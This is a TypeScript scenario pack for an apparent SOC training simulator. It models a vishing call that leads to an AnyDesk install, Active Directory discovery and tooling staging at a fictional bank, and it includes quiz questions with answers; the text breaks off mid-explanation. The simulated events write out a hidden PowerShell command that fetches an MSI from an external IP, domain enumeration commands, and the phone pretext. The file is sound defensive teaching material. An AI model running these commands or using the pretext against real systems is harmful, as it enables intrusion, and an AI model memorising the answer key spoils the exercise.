/**
 * Scenario pack: "Callback Vishing — RMM Install to Hands-on-Keyboard Discovery"
 *
 * INTERMEDIATE tier. A voice-phishing (vishing) initial-access intrusion of the
 * kind that has driven the largest 2023-2025 help-desk breaches. There is no
 * exploit and no malware dropper: an operator phones an employee, poses as the
 * bank's internal IT "service desk", and talks her through installing a
 * completely legitimate, code-signed remote-access tool (AnyDesk). From that
 * hands-on-keyboard session the operator runs Active Directory discovery and
 * stages follow-on tooling.
 *
 * The deliberately uncomfortable teaching point: AnyDesk.exe is signed by
 * AnyDesk GmbH and its signature verifies. Nothing about the binary is
 * malicious. What makes THIS an incident is entirely the context around it —
 * the install happened minutes after an unsolicited inbound call, AnyDesk is an
 * RMM the bank does not deploy (its sanctioned tool is ConnectWise
 * ScreenConnect, run only by internal technicians against user-opened tickets),
 * the session is driven by an external operator ID, and it is immediately
 * followed by whoami / net group "Domain Admins" / nltest enumeration. A student
 * who keys on "the binary is signed and legitimate, so clear it" fails the case.
 *
 * The benign control (evt_vrmm_00) is the sanctioned mirror image: the bank's
 * own IT running its approved ScreenConnect RMM against a ticket the user opened
 * herself, operated by a known internal technician. Same structural shape — an
 * RMM ran and a remote session was established — opposite verdict. The signal is
 * the context, not the tool.
 *
 * SOURCES: crowdstrike-falcon (the AnyDesk process, the discovery children, and
 * the alert-grade detection), zscaler-internet-access (the AnyDesk download, the
 * AnyDesk cloud-relay session, and the staged-tooling pull), servicenow-itsm
 * (the vishing help-desk ticket that gives the context), microsoft-defender-endpoint
 * (one corroborating network event on the AnyDesk relay connection).
 *
 * Covers T1566.004 (Spearphishing Voice), T1219 (Remote Access Software),
 * T1033 / T1087.002 / T1482 (discovery) and T1059.001 (PowerShell). It fills the
 * social-engineering / initial-access RMM-abuse gap in the pack catalogue.
 *
 * NOTE: register in scenarios.ts with difficulty "intermediate" (the
 * ScenarioBundle itself carries no difficulty field). Company allowlist:
 * quantumbank — the profile running CrowdStrike Falcon + Zscaler + a Windows AD
 * estate.
 */

import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

export function buildVishingRmmScenario(scenarioId = "vishing-rmm-2026"): ScenarioBundle {
  const B = new Date("2026-06-16T13:20:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  // One incident — the whole vishing-to-discovery chain is a single case.
  const INCIDENT = "inc:vrmm:1";

  // The bank, its AD estate, and the socially-engineered employee.
  const domain = "QUANTUMBANK";
  const victim = {
    sam: "p.roth",
    email: "p.roth@quantumbank.ch",
    title: "Payments Operations Clerk",
    hostname: "WKS-QB-047",
    ip: "10.100.1.47",
  };

  // The external operator's AnyDesk peer ID — surfaced as evidence in the ticket
  // and the detection, not as an IOC (an AnyDesk ID is not a typed indicator).
  const operatorId = "793 041 268";

  // AnyDesk: a legitimate, code-signed RMM the bank does NOT deploy. The download
  // source, the cloud relay it connects through, and the staged follow-on tool.
  const anydeskHash = makeSha256("vishing_rmm_anydesk_signed_binary_2026");
  const anydeskPath = `C:\\Users\\${victim.sam}\\Downloads\\AnyDesk.exe`;
  const downloadHost = "download.anydesk.com";
  const relayHost = "relay-fra-3.net.anydesk.com";
  const relayIp = "51.83.131.52";
  const stagingIp = "45.86.230.14";
  const stagingUrl = `http://${stagingIp}/support/qb-agent.msi`;

  const falconSensor = "a17c9e2f4b8d40516c3a7e91d2b0f843";
  const reportId = "88213047";

  // The benign control: the bank's sanctioned ConnectWise ScreenConnect RMM,
  // operated by a known internal technician against a ticket the user opened.
  const benign = {
    sam: "e.fischer",
    email: "e.fischer@quantumbank.ch",
    hostname: "WKS-QB-061",
    ip: "10.100.1.61",
  };
  const benignTech = "m.brandt";
  const benignTicket = "INC0092233";
  const scEnclave = "C:\\Program Files (x86)\\ScreenConnect Client (7a3f9c21b8d4e650)\\ScreenConnect.ClientService.exe";

  // The vishing help-desk ticket.
  const vishTicket = "INC0092571";

  const events: TelemetryEvent[] = [
    // ─────────────────────────────────────────────────────────────────────
    // 0. BENIGN CONTROL — a SANCTIONED remote-support session.
    //    The bank's approved RMM (ConnectWise ScreenConnect), run by a known
    //    internal technician against a ticket the user opened herself. Same
    //    "RMM ran + remote session" shape as the attack, opposite verdict.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_00_benign_screenconnect",
      ts: "2026-06-15T14:05:00.000Z",
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: benign.hostname,
      user_email: benign.email,
      src_ip: benign.ip,
      severity: "informational",
      expected_verdict: "fp",
      fp_explanation:
        `The control case for the whole scenario. This is ALSO a signed remote-access tool running and establishing a remote session — structurally identical to the attack — yet entirely legitimate. Three things make it sanctioned: it is ConnectWise ScreenConnect, the RMM the bank actually deploys (its client is pre-installed under Program Files, not run from a user's Downloads folder); it is tied to ${benignTicket}, a ticket ${benign.sam} opened herself through the portal; and it is operated by a known internal technician (${benignTech}). Compare every one of those against the AnyDesk activity on ${victim.hostname}. A student who clears a remote-access tool because "it's signed and legitimate" will wrongly clear the attack too — the tool is the same class of thing; only the context differs.`,
      description:
        `The sanctioned ConnectWise ScreenConnect client on ${benign.hostname} started a remote-support session at 14:05 the previous afternoon and connected to relay.screenconnect.com. It maps to help-desk ticket ${benignTicket}, opened by the machine's own user, and the session was driven by internal technician ${benignTech}.`,
      process: {
        name: "ScreenConnect.ClientService.exe",
        pid: 3120,
        path: scEnclave,
        parent_name: "services.exe",
        parent_pid: 728,
        cmdline: `"${scEnclave}" "?e=Access&y=Guest&h=instance-qb.screenconnect.com&p=443"`,
        user: "NT AUTHORITY\\SYSTEM",
        integrity: "system",
        hash: { sha256: makeSha256("vishing_rmm_screenconnect_sanctioned_client_2026") },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": benign.hostname,
        "event.action": "process_created",
        "process.name": "ScreenConnect.ClientService.exe",
        "process.pid": "3120",
        "process.executable": scEnclave,
        "process.command_line": `"${scEnclave}" "?e=Access&y=Guest&h=instance-qb.screenconnect.com&p=443"`,
        "process.parent.name": "services.exe",
        "process.parent.pid": "728",
        "process.code_signature.status": "trusted",
        "process.code_signature.subject_name": "ConnectWise, LLC",
        "process.integrity_level": "System",
        "destination.domain": "relay.screenconnect.com",
        "destination.port": "443",
        "user.name": `${domain}\\${benign.sam}`,
        "host.name": benign.hostname,
        "host.ip": benign.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 1. THE VISHING TICKET — the help-desk record that gives the context.
    //    An inbound phone contact for p.roth requesting installation of a
    //    remote-support tool, referencing an external session ID (T1566.004).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_01_vishing_ticket",
      ts: T(0),
      source: "soar",
      vendor: "ServiceNow ITSM",
      event_type: "policy_modification",
      severity: "low",
      mitre_technique: "T1566.004",
      mitre_tactic: "Initial Access",
      user_email: victim.email,
      description:
        `Ticket ${vishTicket} was logged as a phone contact for ${victim.sam}: the caller was told by someone identifying as IT security to install a remote-support tool so the "account could be secured", and asked the service desk to whitelist it. The package named is AnyDesk — not on the bank's approved software list — and the record notes an external session ID.`,
      raw: {
        "servicenow.table": "incident",
        "servicenow.number": vishTicket,
        "servicenow.short_description": "Assistance installing remote support tool requested during IT security call",
        "servicenow.description":
          `Caller ${victim.sam} states an IT security representative phoned to advise the account was flagged and remote assistance is required. Caller was directed to download AnyDesk and share the connection so the representative could "secure the workstation". Caller referenced remote session ID ${operatorId}. Requesting the tool be permitted.`,
        "servicenow.category": "Software",
        "servicenow.subcategory": "Installation",
        "servicenow.contact_type": "Phone",
        "servicenow.priority": "3 - Moderate",
        "servicenow.urgency": "2 - High",
        "servicenow.impact": "3 - Low",
        "servicenow.state": "In Progress",
        "servicenow.caller_id": victim.email,
        "servicenow.opened_by": "servicedesk@quantumbank.ch",
        "servicenow.assignment_group": "IT Service Desk",
        "servicenow.u_package_name": "AnyDesk",
        "servicenow.u_package_version": "8.0.11",
        "servicenow.u_identity_verification": "Caller name matched directory; no callback to a listed number performed",
        "servicenow.u_verification_result": "Not verified",
        "servicenow.opened_at": "2026-06-16 13:20:00",
        "servicenow.sys_created_on": "2026-06-16 13:20:00",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 2. THE DOWNLOAD — AnyDesk pulled from the vendor's own CDN through the
    //    proxy. A legitimate, allowed download; the tell is what asks for it
    //    and when, not the file itself.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_02_anydesk_download",
      ts: T(3 * MIN),
      source: "proxy",
      vendor: "Zscaler Internet Access",
      event_type: "http_request",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "medium",
      description:
        `The Zscaler proxy allowed a download of AnyDesk.exe from ${downloadHost} to ${victim.hostname} at 13:23, three minutes after the call ticket was logged. The URL is categorised as a remote-access tool.`,
      network: { url: `https://${downloadHost}/AnyDesk.exe`, domain: downloadHost, method: "GET", status: 200, bytes_in: 5242880 },
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.reason": "Category allowed",
        "zscaler.login": victim.sam,
        "zscaler.url": `https://${downloadHost}/AnyDesk.exe`,
        "zscaler.hostname": downloadHost,
        "zscaler.urlcategory": "Remote Access Tools",
        "zscaler.reqmethod": "GET",
        "zscaler.respcode": 200,
        "zscaler.useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.2592.87",
        "zscaler.appname": "AnyDesk",
        "zscaler.respsize": 5242880,
        "zscaler.cip": victim.ip,
        "user.name": victim.sam,
        "user.email": victim.email,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 3. THE INSTALL / RUN — AnyDesk.exe executes from Downloads. Falcon
    //    records it as a fully signed, trusted binary (AnyDesk GmbH). This is
    //    the crux: legitimate tool, run in an illegitimate context (T1219).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_03_anydesk_exec",
      ts: T(4 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1219",
      mitre_tactic: "Command and Control",
      description:
        `${victim.sam} launched AnyDesk.exe from the Downloads folder on ${victim.hostname}. Falcon reports the binary as signed and trusted (AnyDesk GmbH). The bank's estate does not otherwise carry AnyDesk — its approved remote tool is ScreenConnect.`,
      process: {
        name: "AnyDesk.exe",
        pid: 6412,
        path: anydeskPath,
        parent_name: "explorer.exe",
        parent_pid: 4180,
        cmdline: `"${anydeskPath}"`,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: anydeskHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "event.action": "process_created",
        "process.name": "AnyDesk.exe",
        "process.pid": "6412",
        "process.executable": anydeskPath,
        "process.command_line": `"${anydeskPath}"`,
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "4180",
        "process.hash.sha256": anydeskHash,
        "process.code_signature.status": "trusted",
        "process.code_signature.subject_name": "AnyDesk Software GmbH",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 4. THE RELAY SESSION — AnyDesk connects out to its cloud relay, opening
    //    the hands-on channel for the external operator.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_04_anydesk_relay",
      ts: T(5 * MIN),
      source: "proxy",
      vendor: "Zscaler Internet Access",
      event_type: "net_connection",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      dst_ip: relayIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      description:
        `AnyDesk on ${victim.hostname} established an outbound session to the AnyDesk cloud relay ${relayHost} (${relayIp}) over TCP/443 — the tunnel through which the remote operator drives the keyboard.`,
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.client_app": "AnyDesk",
        "zscaler.login": victim.sam,
        "zscaler.hostname": relayHost,
        "zscaler.urlcategory": "Remote Access Tools",
        "zscaler.appname": "AnyDesk",
        "zscaler.cip": victim.ip,
        "zscaler.sip": relayIp,
        "zscaler.serverip": relayIp,
        "zscaler.respsize": 184320,
        "session.bytes": 184320,
        "user.name": victim.sam,
        "user.email": victim.email,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 5. MDE CORROBORATION — Defender for Endpoint independently records the
    //    same AnyDesk relay connection from the endpoint side.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_05_mde_relay_corroboration",
      ts: T(5 * MIN + 30 * SEC),
      source: "edr",
      vendor: "Microsoft Defender for Endpoint",
      event_type: "net_connection",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      dst_ip: relayIp,
      dst_port: 443,
      protocol: "tcp",
      severity: "medium",
      description:
        `Defender for Endpoint logged a successful outbound connection from AnyDesk.exe on ${victim.hostname} to ${relayHost} (${relayIp}) on port 443 — the same relay session, seen from the host telemetry.`,
      process: {
        name: "AnyDesk.exe",
        pid: 6412,
        path: anydeskPath,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: anydeskHash },
      },
      raw: {
        "Timestamp": T(5 * MIN + 30 * SEC),
        "DeviceName": `${victim.hostname.toLowerCase()}.quantumbank.ch`,
        "ActionType": "ConnectionSuccess",
        "RemoteUrl": relayHost,
        "RemoteIP": relayIp,
        "RemotePort": 443,
        "Protocol": "Tcp",
        "InitiatingProcessFileName": "AnyDesk.exe",
        "InitiatingProcessCommandLine": `"AnyDesk.exe"`,
        "InitiatingProcessFolderPath": anydeskPath,
        "InitiatingProcessAccountName": victim.sam,
        "InitiatingProcessAccountDomain": domain,
        "InitiatingProcessSHA256": anydeskHash,
        "ReportId": reportId,
        "mde.DetectionSource": "EDR",
        "mde.Category": "SuspiciousActivity",
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 6. DISCOVERY #1 — whoami /all. The operator's first move once on the
    //    keyboard: who am I and what do I hold (T1033).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_06_disc_whoami",
      ts: T(7 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "medium",
      mitre_technique: "T1033",
      mitre_tactic: "Discovery",
      description:
        `On ${victim.hostname}, AnyDesk.exe spawned cmd.exe which ran "whoami /all" — an interactive enumeration of the current account's identity, groups and privileges, spawned by the remote-access tool rather than by the user's shell.`,
      process: {
        name: "whoami.exe",
        pid: 6890,
        path: "C:\\Windows\\System32\\whoami.exe",
        parent_name: "cmd.exe",
        parent_pid: 6720,
        cmdline: "whoami /all",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "whoami.exe",
        "process.pid": "6890",
        "process.executable": "C:\\Windows\\System32\\whoami.exe",
        "process.command_line": "whoami /all",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "6720",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 7. DISCOVERY #2 — net group "Domain Admins" /domain. Enumerating the
    //    privileged accounts in the directory (T1087.002).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_07_disc_domain_admins",
      ts: T(8 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1087.002",
      mitre_tactic: "Discovery",
      description:
        `cmd.exe on ${victim.hostname} ran 'net group "Domain Admins" /domain', listing the members of the domain's most privileged group — reconnaissance a payments clerk's workstation has no routine reason to perform.`,
      process: {
        name: "net.exe",
        pid: 7024,
        path: "C:\\Windows\\System32\\net.exe",
        parent_name: "cmd.exe",
        parent_pid: 6720,
        cmdline: 'net group "Domain Admins" /domain',
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "net.exe",
        "process.pid": "7024",
        "process.executable": "C:\\Windows\\System32\\net.exe",
        "process.command_line": 'net group "Domain Admins" /domain',
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "6720",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 8. DISCOVERY #3 — nltest /domain_trusts. Mapping the domain trust
    //    relationships to plan onward movement (T1482).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_08_disc_nltest",
      ts: T(9 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1482",
      mitre_tactic: "Discovery",
      description:
        `cmd.exe on ${victim.hostname} ran "nltest /domain_trusts /all_trusts", enumerating the domain's trust relationships — an operator mapping the environment beyond the single host.`,
      process: {
        name: "nltest.exe",
        pid: 7188,
        path: "C:\\Windows\\System32\\nltest.exe",
        parent_name: "cmd.exe",
        parent_pid: 6720,
        cmdline: "nltest /domain_trusts /all_trusts",
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "cmd.exe",
        "event.action": "process_created",
        "process.name": "nltest.exe",
        "process.pid": "7188",
        "process.executable": "C:\\Windows\\System32\\nltest.exe",
        "process.command_line": "nltest /domain_trusts /all_trusts",
        "process.parent.name": "cmd.exe",
        "process.parent.pid": "6720",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 9. STAGING — an encoded PowerShell fetches follow-on tooling from an
    //    external IP, spawned by the AnyDesk session (T1059.001).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_09_powershell_stage",
      ts: T(12 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "high",
      mitre_technique: "T1059.001",
      mitre_tactic: "Execution",
      description:
        `AnyDesk.exe spawned a hidden-window PowerShell on ${victim.hostname} that used Invoke-WebRequest to pull qb-agent.msi from ${stagingIp} into the user's Temp folder — the operator staging follow-on tooling.`,
      process: {
        name: "powershell.exe",
        pid: 7460,
        path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_name: "AnyDesk.exe",
        parent_pid: 6412,
        cmdline: `powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri ${stagingUrl} -OutFile $env:TEMP\\qb-agent.msi"`,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "crowdstrike.ParentProcessName": "AnyDesk.exe",
        "event.action": "process_created",
        "process.name": "powershell.exe",
        "process.pid": "7460",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": `powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri ${stagingUrl} -OutFile $env:TEMP\\qb-agent.msi"`,
        "process.parent.name": "AnyDesk.exe",
        "process.parent.pid": "6412",
        "process.integrity_level": "Medium",
        "user.name": `${domain}\\${victim.sam}`,
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 10. STAGING TRAFFIC — the proxy records the qb-agent.msi pull from the
    //     external staging host over HTTP.
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_10_staging_download",
      ts: T(12 * MIN + 20 * SEC),
      source: "proxy",
      vendor: "Zscaler Internet Access",
      event_type: "http_request",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      dst_ip: stagingIp,
      dst_port: 80,
      severity: "high",
      description:
        `Zscaler recorded a PowerShell user-agent pulling qb-agent.msi from ${stagingIp} over HTTP at 13:32 — a raw-IP host with no category, fetched by the same workstation moments after the PowerShell launched.`,
      network: { url: stagingUrl, domain: stagingIp, method: "GET", status: 200, bytes_in: 2734080, user_agent: "WindowsPowerShell/5.1.19041.4046" },
      raw: {
        "zscaler.action": "Allowed",
        "zscaler.login": victim.sam,
        "zscaler.url": stagingUrl,
        "zscaler.hostname": stagingIp,
        "zscaler.urlcategory": "Miscellaneous or Unknown",
        "zscaler.reqmethod": "GET",
        "zscaler.respcode": 200,
        "zscaler.useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.4046",
        "zscaler.cip": victim.ip,
        "zscaler.sip": stagingIp,
        "zscaler.serverip": stagingIp,
        "zscaler.respsize": 2734080,
        "user.name": victim.sam,
      },
    },

    // ─────────────────────────────────────────────────────────────────────
    // 11. THE DETECTION — Falcon raises the alert-grade detection that opened
    //     the ticket, tying the unmanaged RMM to the hands-on discovery.
    //     is_detection + edr_scope "hybrid" (host process tree AND the ITSM /
    //     download context).
    // ─────────────────────────────────────────────────────────────────────
    {
      id: "evt_vrmm_11_falcon_detection",
      ts: T(14 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: victim.hostname,
      user_email: victim.email,
      src_ip: victim.ip,
      severity: "critical",
      mitre_technique: "T1219",
      mitre_tactic: "Command and Control",
      is_detection: true,
      edr_scope: "hybrid",
      description:
        `Falcon raised a High detection on ${victim.hostname}: an unmanaged remote-access tool (AnyDesk), run from a user Downloads folder and driven by external session ${operatorId}, spawning cmd.exe, net.exe, nltest.exe and PowerShell in quick succession — a remote operator enumerating the domain and staging tooling.`,
      process: {
        name: "AnyDesk.exe",
        pid: 6412,
        path: anydeskPath,
        parent_name: "explorer.exe",
        parent_pid: 4180,
        user: `${domain}\\${victim.sam}`,
        integrity: "medium",
        hash: { sha256: anydeskHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "Unmanaged Remote Access Tool With Interactive Discovery",
        "crowdstrike.Tactic": "Command and Control",
        "crowdstrike.Technique": "Remote Access Software",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.SensorId": falconSensor,
        "crowdstrike.ComputerName": victim.hostname,
        "process.name": "AnyDesk.exe",
        "process.hash.sha256": anydeskHash,
        "threat.tactic.name": "Command and Control",
        "threat.tactic.id": "TA0011",
        "threat.technique.name": "Remote Access Software",
        "threat.technique.id": "T1219",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
        "user.name": `${domain}\\${victim.sam}`,
        "event.outcome": "success",
      },
    },
  ];

  // Every event belongs to the one vishing-RMM incident.
  for (const e of events) e.incident_id = INCIDENT;

  const iocs: IOC[] = [
    {
      type: "sha256",
      value: anydeskHash, // the AnyDesk binary — a legitimate signed tool, IOC of THIS activity
      first_seen: T(4 * MIN),
      last_seen: T(14 * MIN),
      reputation: "unknown",
      tags: ["remote-access-tool", "unmanaged", "signed-binary"],
    },
    {
      type: "domain",
      value: downloadHost, // download.anydesk.com — where the tool was fetched
      first_seen: T(3 * MIN),
      last_seen: T(3 * MIN),
      reputation: "unknown",
      tags: ["remote-access-tool", "vendor-cdn"],
    },
    {
      type: "domain",
      value: relayHost, // the AnyDesk cloud endpoint the session tunnelled through
      first_seen: T(5 * MIN),
      last_seen: T(5 * MIN + 30 * SEC),
      reputation: "unknown",
      tags: ["remote-access-tool", "anydesk-cloud"],
    },
    {
      type: "ip",
      value: stagingIp, // the external host serving the follow-on tooling
      first_seen: T(12 * MIN),
      last_seen: T(12 * MIN + 20 * SEC),
      reputation: "malicious",
      tags: ["external", "tool-staging", "raw-ip-host"],
    },
    {
      type: "user",
      value: victim.sam, // p.roth — the socially-engineered account
      first_seen: T(0),
      last_seen: T(14 * MIN),
      reputation: "suspicious",
      tags: ["social-engineering-target", "hands-on-keyboard"],
    },
    {
      type: "host",
      value: victim.hostname, // WKS-QB-047 — the affected workstation
      first_seen: T(0),
      last_seen: T(14 * MIN),
      reputation: "unknown",
      tags: ["affected", "workstation"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "q1",
      prompt:
        "How did the operator get hands-on access to WKS-QB-047 in the first place? Read the ServiceNow ticket (evt_vrmm_01) against the download and install that follow it.",
      hint: "Look at the contact_type on the ticket, who initiated the call, and the three-minute gap before the download.",
      kind: "single",
      options: [
        { value: "vishing_call", label: "An inbound phone call impersonating IT security talked p.roth into downloading and running AnyDesk, then sharing the session — the install was driven by the caller, not by IT" },
        { value: "phishing_link", label: "p.roth clicked a link in a phishing email that silently installed AnyDesk in the background without any interaction" },
        { value: "exploit", label: "The operator exploited an unpatched vulnerability on the workstation to drop AnyDesk remotely, with no user involvement at all" },
        { value: "insider", label: "p.roth is a malicious insider who installed AnyDesk deliberately to give an outside party covert access to the bank" },
      ],
      answer: "vishing_call",
      xp: 55,
      explanation:
        "The ticket is the context that makes sense of everything after it: contact_type is Phone, the caller is p.roth reporting that 'an IT security representative phoned', and she was 'directed to download AnyDesk and share the connection'. Three minutes later the download appears, then the install. That is callback/voice-phishing (vishing) initial access (T1566.004) — the operator never touched the machine directly; they talked the employee into opening the door. (b) is wrong: the download is an explicit user-driven GET of AnyDesk.exe, and nothing silent or email-borne appears. (c) is wrong: there is no exploit or remote drop — the tool is downloaded and launched interactively by the user. (d) misreads a socially-engineered victim as an insider; the ticket shows she was deceived by an inbound caller, not acting against the bank.",
    },
    {
      id: "q2",
      prompt:
        "Falcon reports AnyDesk.exe as signed and trusted — code_signature.status 'trusted', subject 'AnyDesk Software GmbH'. The binary is a genuine, legitimate remote-access product. So why is it correct to treat this as malicious?",
      hint: "A tool is not the same as its use. Ask what is different here versus the ScreenConnect session in evt_vrmm_00.",
      kind: "single",
      options: [
        { value: "context", label: "The malice is the context, not the file: an RMM the bank does not deploy, run from a Downloads folder right after an unsolicited call, driven by an external session ID, and immediately followed by domain enumeration" },
        { value: "hash_bad", label: "The SHA256 matches a known-malicious hash in threat intelligence, so despite the signature the binary is confirmed malware" },
        { value: "forged_sig", label: "The code signature is counterfeit — attackers copied AnyDesk's certificate, and Falcon marking it 'trusted' is a validation failure" },
        { value: "any_rmm", label: "Any remote-access tool running on an endpoint is malicious by definition, so the verdict does not depend on the surrounding events" },
      ],
      answer: "context",
      xp: 70,
      explanation:
        "This is the whole lesson. A signed, legitimate binary tells you the file is what it claims to be — it says nothing about whether its use is authorised. Every signal that matters here is contextual: AnyDesk is not the bank's deployed RMM (ScreenConnect is), it was run from a user's Downloads folder rather than a managed install path, it started minutes after an inbound 'IT security' call, it is driven by an external operator ID, and within minutes it spawns whoami, net group \"Domain Admins\" and nltest. (b) invents intel that is not present — the binary is the real, clean AnyDesk. (c) is refuted by the record: the signature is genuinely trusted, not counterfeit. (d) over-corrects into a rule that would also condemn the sanctioned ScreenConnect session in evt_vrmm_00 — the benign control exists precisely to show that an RMM alone is not a verdict.",
    },
    {
      id: "q3",
      prompt:
        "The previous afternoon a ScreenConnect remote-support session ran on WKS-QB-061 (evt_vrmm_00) — also a signed RMM opening a remote session. It is benign. Which combination of facts separates it from the AnyDesk activity on WKS-QB-047?",
      hint: "Compare the tool, the install location, the ticket's origin, and who was operating each session.",
      kind: "single",
      options: [
        { value: "managed_ticket_tech", label: "ScreenConnect is the bank's deployed RMM installed under Program Files, tied to a ticket the user opened herself, and run by a known internal technician; the AnyDesk case is an undeployed tool from Downloads, driven by an inbound-call ticket and an external operator" },
        { value: "encryption", label: "The ScreenConnect session used TLS to relay.screenconnect.com while the AnyDesk session was unencrypted, which is the difference that makes one safe and the other not" },
        { value: "severity_field", label: "The ScreenConnect event is tagged informational and the AnyDesk events are tagged high, and that severity labelling is what distinguishes benign from malicious" },
        { value: "time_of_day", label: "The ScreenConnect session ran during business hours and the AnyDesk session ran overnight, which is the only meaningful difference between them" },
      ],
      answer: "managed_ticket_tech",
      xp: 65,
      explanation:
